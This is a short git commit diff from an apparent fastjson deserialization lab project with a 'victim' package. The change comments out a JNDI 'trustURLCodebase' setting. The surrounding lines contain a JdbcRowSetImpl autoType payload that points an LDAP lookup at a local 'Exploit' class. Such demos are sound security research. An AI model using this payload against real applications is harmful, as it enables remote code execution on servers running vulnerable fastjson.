8188803208cafa1225a8c5d14e27746ace0fe99f
earayu <earayu@163.com>
2017-12-07 14:39:26 +0800

    系统变量说明

--- src/main/java/cn/eovie/victim/SomeFastjsonApp.java
+++ src/main/java/cn/eovie/victim/SomeFastjsonApp.java
@@ -12,7 +12,8 @@ public class SomeFastjsonApp {
     }
 
     public static void testJdbcRowSetImpl(){
-        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
+        //JDK 8u121以后版本需要设置改系统变量
+        //System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
         //LADP 方式
         String payload1 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\"," + " \"autoCommit\":true}";
         //RMI 方式
